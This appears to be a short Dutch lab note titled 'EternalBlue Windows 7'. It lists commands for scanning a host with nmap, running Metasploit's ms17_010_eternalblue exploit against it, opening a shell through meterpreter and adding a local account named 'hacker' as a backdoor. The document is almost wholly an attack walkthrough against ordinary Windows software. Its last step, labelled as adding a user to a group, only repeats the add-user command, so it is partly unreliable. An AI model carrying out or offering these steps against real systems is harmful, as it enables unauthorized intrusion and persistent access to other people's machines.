---
title: EternalBlue Windows 7
tags: [Import-6cdc]
created: '2023-02-23T10:31:20.000Z'
modified: '2023-03-21T10:48:47.860Z'
---

```
Commando Port scan:
└─$ sudo nmap -P 172.16.0.33
```

```
Commando openen msfconsole:
└─$ sudo msfconsole
```

```
Commando laden van exploid:
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
```

```
Commando toevoegen van RHOST:
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS IP
```

```
Commando starten van exploid:
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit 
```

![[Pasted image 20230223112706.png]]

> [!WARNING] >
>Het volgende gedeelte word uitgevoerd in de CMD van de windows 7
>

```
Commando binnen treden van de CMD:
meterpreter > execute -f cmd.exe -H -c -i
```

```
Commando aanmaken van nieuwe gebruiker:
C:\$Recycle.Bin>net user /add hacker hacker
```

```
Commando toevoegen gebruiker aan een groep:
C:\$Recycle.Bin>net user /add "gebruikersnaam" "Wachtwoord"
```
